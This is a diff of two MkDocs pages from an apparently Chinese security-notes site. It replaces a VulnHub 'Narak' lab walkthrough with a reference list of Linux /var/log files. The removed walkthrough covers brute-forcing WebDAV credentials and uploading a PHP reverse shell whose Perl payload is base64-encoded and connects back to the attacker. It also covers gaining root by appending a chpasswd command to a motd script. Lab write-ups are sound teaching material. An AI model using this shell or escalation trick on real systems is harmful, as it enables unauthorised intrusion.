@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../msf%E6%8A%93%E5%8C%85/">
+        <link rel="prev" href="../shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2016-4437%29/">
       
       
-        <link rel="next" href="../rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+        <link rel="next" href="../vulhub_Lame/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>Narak - 陈奕霖</title>
+        <title>Varlog目录下日志文件 - 陈奕霖</title>
       
     
     
@@ -66,11 +66,6 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
-        
-        <a href="#_1" class="md-skip">
-          跳转至
-        </a>
-      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Narak
+              Varlog目录下日志文件
             
           </span>
         </div>
@@ -785,62 +780,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Narak
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../narak/" class="md-nav__link">
         Narak
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、信息搜集：
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    二、漏洞利用与探测：
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    三、提权
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -878,11 +822,19 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../varlog%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Varlog目录下日志文件
       </a>
+      
     </li>
   
 
@@ -954,35 +906,6 @@
   
   
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、信息搜集：
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    二、漏洞利用与探测：
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    三、提权
-  </a>
-  
-</li>
-      
-    </ul>
-  
 </nav>
                   </div>
                 </div>
@@ -996,228 +919,74 @@
                   
 
 
-  <h1>Narak</h1>
+  <h1>Varlog目录下日志文件</h1>
 
-<p>靶机网址：<a href="https://www.vulnhub.com/entry/ha-narak,569/">HA: Narak ~ VulnHub</a></p>
-<hr />
-<h2 id="_1"><strong>一、信息搜集：</strong></h2>
+<p>中一些只有特定版本采用，如dpkg.log只能在基于Debian的系统中看到。</p>
 <ol>
-<li><strong>获取IP：</strong></li>
+<li>/var/log/messages —     包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在</li>
 </ol>
-<p><strong>nmap -sP 192.168.8.0/24</strong>  </p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609325.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>var/log/messages日志中。</p>
 <ol>
-<li><strong>端口扫描：</strong></li>
+<li>/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动</li>
 </ol>
-<p><strong>nmap -sV -p- -sC 192.168.8.132 -n -vv</strong></p>
-<p><strong>22、80端口均开启</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609714.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。</p>
 <ol>
-<li><strong>访问192.168.8.132</strong></li>
+<li>/var/log/auth.log —     包含系统授权信息，包括用户登录和使用的权限机制等。</li>
+<li>/var/log/boot.log — 包含系统启动时的日志。</li>
+<li>/var/log/daemon.log — 包含各种系统后台守护进程日志信息。</li>
+<li>/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。</li>
+<li>/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问</li>
 </ol>
-<p><strong>从页面搜索信息</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212610480.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212608986.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>·</strong></p>
-<p><strong>翻译了一下网页内容信息提取关键字或许有用： yamdoot,swarm,narak</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609185.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>题。</p>
 <ol>
-<li><strong>目录扫描：</strong></li>
+<li>/var/log/lastlog —     记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。</li>
+<li>/var/log/maillog     /var/log/mail.log — 包含来着系统运行电子邮件服务器</li>
 </ol>
-<p><strong>gobuster dir -q -u *<em>http://192.168.8.132*</em> -w /usr/share/seclists/Discovery/Web-Content/common.txt</strong></p>
-<p><strong>注意到/webdav</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609227.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>访问该目录</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421261084.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>用上边关键字随便输入尝试登录也没用</strong></p>
+<p>的日志信息。例如，sendmail日志信息就全部送到这个文件中。</p>
 <ol>
-<li><strong>尝试爆破获取密码</strong></li>
+<li>/var/log/user.log —     记录所有等级用户信息的日志。</li>
+<li>/var/log/Xorg.x.log — 来自X的日志信息。</li>
+<li>/var/log/alternatives.log –     更新替代信息都记录在这个文件中。</li>
+<li>/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文</li>
 </ol>
-<p><strong>先爬取密码文件</strong></p>
-<p><strong>cewl 192.168.8.132 -w passwd1.txt</strong> </p>
-<p><strong>再用hydra爆破以下</strong></p>
-<p><strong>账号密码：yamdoot, Swarg</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609396.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>再尝试登陆下：</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260972.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>件。例如，”last -f /var/log/btmp | more“。</p>
 <ol>
-<li><strong>无可用信息，查看下源代码：</strong></li>
+<li>/var/log/cups —     涉及所有打印信息的日志。</li>
+<li>/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文</li>
 </ol>
-<p><strong>意思是服务器无法验证我是否有权访问该文档，或者密码或者证书的问题</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260953.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>件中。</p>
 <ol>
-<li><strong>查找关于webdav的漏洞文章</strong></li>
+<li>/var/log/yum.log —     包含使用yum安装的软件包信息。</li>
+<li>/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在</li>
 </ol>
-<p><strong>用Metasploits模块检查是否启用了webdav</strong></p>
-<p><strong>使用 ：auxiliary/scanner/http/webdav_scanner</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609709.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>设置参数：</strong></p>
-<p><strong>将路径改为 /dav,这是webdav常用目录</strong></p>
-<p><strong>设置目标IP地址</strong></p>
-<p><strong>run启动模块</strong></p>
-<p><strong>扫描结果：</strong></p>
-<p><strong>http信息，包括apache版本，是否启用webdav</strong></p>
-<p><strong>显然结果是没开启，所以这条路行不通</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609542.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>这个文件中。</p>
 <ol>
-<li><strong>再搜索关于webdav（可以上传文件）:</strong></li>
+<li>/var/log/secure —     包含验证和授权方面信息。例如，sshd会将所有信息</li>
 </ol>
-<p><strong>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 *<em><a href="https://baike.baidu.com/item/HTTP">HTTP</a>*<em> 1.1协议的*</em><a href="https://baike.baidu.com/item/通信协议/3351624">通信协议</a>*<em>。它*</em><a href="https://baike.baidu.com/item/扩展/2732987">扩展</a>*<em>了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使*</em><a href="https://baike.baidu.com/item/应用程序/5985445">应用程序</a>*<em>可对*</em><a href="https://baike.baidu.com/item/Web Server/9306055">Web Server</a>*<em>直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的*</em><a href="https://baike.baidu.com/item/版本控制/3311252">版本控制</a>*</em></strong></p>
-<p><strong>所以进一步可以实行上传一个反链接脚本</strong></p>
-<h2 id="_2"><strong>二、漏洞利用与探测：</strong></h2>
+<p>记录（其中包括失败登录）在这里。</p>
 <ol>
-<li><strong>查找到cadaver可以对webdav进行读写</strong></li>
+<li>/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁</li>
 </ol>
-<p><strong>上传一个php的反链脚本</strong></p>
-<p><strong>代码如下（更改IP和端口）：</strong></p>
-<div class="highlight"><pre><span></span><code>&lt;?php
-
-function which($pr) {
-
-$path = execute(&quot;which $pr&quot;);
-
-return ($path ? $path : $pr);
-
-}
-
-function execute($cfe) {
-
-$res = &#39;&#39;;
-
-if ($cfe) {
-
-if(function_exists(&#39;exec&#39;)) {
-
-@exec($cfe,$res);
-
-$res = join(&quot;\n&quot;,$res);
-
-} elseif(function_exists(&#39;shell_exec&#39;)) {
-
-$res = @shell_exec($cfe);
-
-} elseif(function_exists(&#39;system&#39;)) {
-
-@ob_start();
-
-@system($cfe);
-
-$res = @ob_get_contents();
-
-@ob_end_clean();
-
-} elseif(function_exists(&#39;passthru&#39;)) {
-
-@ob_start();
-
-@passthru($cfe);
-
-$res = @ob_get_contents();
-
-@ob_end_clean();
-
-} elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) {
-
-$res = &#39;&#39;;
-
-while(!@feof($f)) {
-
-$res .= @fread($f,1024);
-
-}
-
-@pclose($f);
-
-}
-
-}
-
-return $res;
-
-}
-
-function cf($fname,$text){
-
-if($fp=@fopen($fname,&#39;w&#39;)) {
-
-@fputs($fp,@base64_decode($text));
-
-@fclose($fp);
-
-}
-
-}
-
-$yourip = &quot;your IP&quot;;
-
-$yourport = &#39;your port&#39;;
-
-$usedb = array(&#39;perl&#39;=&gt;&#39;perl&#39;,&#39;c&#39;=&gt;&#39;c&#39;);
-
-$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.
-
-&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.
-
-&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.
-
-&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.
-
-&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.
-
-&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.
-
-&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;
-
-cf(&#39;/tmp/.bc&#39;,$back_connect);
-
-$res = execute(which(&#39;perl&#39;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);
-
-?&gt;
-</code></pre></div>
-<p><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" /></p>
+<p>正在登陆进入系统，谁使用命令显示这个文件或信息等。</p>
 <ol>
-<li><strong>上传shell</strong></li>
+<li>/var/log/faillog –     包含用户登录失败信息。此外，错误登录命令也会记</li>
 </ol>
-<p><strong>cadaver *<em>http://192.168.8.132/webdav*</em></strong></p>
-<p><strong>username：yamdoot</strong></p>
-<p><strong>password:Swarg</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609217.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>再kali另一个终端开启监听，网页访问192.168.8.132/webdav</strong></p>
-<p><strong>已上传</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260970.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>再去访问shell.php</strong></p>
-<ol>
-<li><strong>建立交互式shell</strong></li>
-</ol>
-<p><strong>kali监听到结果：</strong></p>
-<p><strong>python3 -c 'import pty;pty.spawn("/bin/bash")'</strong></p>
-<p><strong>当前权限不是最高权限，还需要进一步提权</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609546.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>搜索信息</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609150.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260950.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>搜索到一串字符，搜索下Brainfuck可解码</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609880.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260956.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p>​        <strong>得到明文密码：chitragupt</strong></p>
-<p><strong>猜想用户名应该是 inferno narak 中一个</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260921.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<h2 id="_3"><strong>三、提权</strong></h2>
-<ol>
-<li><strong>先尝试inferno登录l连接ssh</strong></li>
-</ol>
-<p><strong>连接成功</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609455.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>搜集信息</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609218.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>利用了motd，通过修改ssh登陆时的欢迎信息对root密码进行修改：</strong></li>
-</ol>
-<p><strong>echo "echo 'root:inferno'|sudo chpasswd" &gt;&gt; /etc/update-motd.d/00-header</strong></p>
-<p><strong>退出后重新用inferno登录</strong></p>
-<p><strong>su -root</strong></p>
-<p><strong>成功获取root权限：</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609398.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>录在本文件中。</p>
+<p>除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录：</p>
+<ul>
+<li>/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log</li>
+</ul>
+<p>信息。</p>
+<ul>
+<li>/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。</li>
+<li>/var/log/mail/ – 这个子目录包含邮件服务器的额外日志。</li>
+<li>/var/log/prelink/ — 包含.so文件被prelink修改的信息。</li>
+<li>/var/log/audit/ — 包含被 Linux audit daemon储存的信息。</li>
+<li>/var/log/samba/ – 包含由samba存储的信息。</li>
+<li>/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。</li>
+<li>/var/log/sssd/ – 用于守护进程安全服务。</li>
+</ul>
+<p>除了手动存档和清除这些日志文件以外，还可以使用logrotate在文件达到一定大小后自动删除。可以尝试用vi，tail，grep和less等命令查看这些日志文件</p>
 
 
 
